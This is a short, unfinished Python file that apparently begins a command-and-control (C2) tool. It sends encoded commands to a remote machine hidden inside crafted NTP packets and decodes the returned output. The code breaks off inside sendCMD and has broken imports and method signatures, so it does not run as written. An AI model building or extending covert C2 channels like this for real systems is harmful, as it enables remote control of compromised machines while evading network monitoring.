import server.convert

class C2:
    def __init__(self, ipaddr, osys):
        self.ipaddr = ipaddr
        self.osys = osys

    #to string for printing
    def __str__(self):
        print("IP: ", self.ipaddr)
        print("Operating System: ", self.osys)

    #send given cmd to API for conversion
    def convertCMD(cmd):
        return convert.encode(cmd)

    #
    def receiveOutput(output):
        return convert.decode(output)
    
    #send command via NTP message, craft mal packet
    def sendCMD(cmd):
        encoded = convertCMD(cmd)
        cPacket = packets.CommandPacket()
        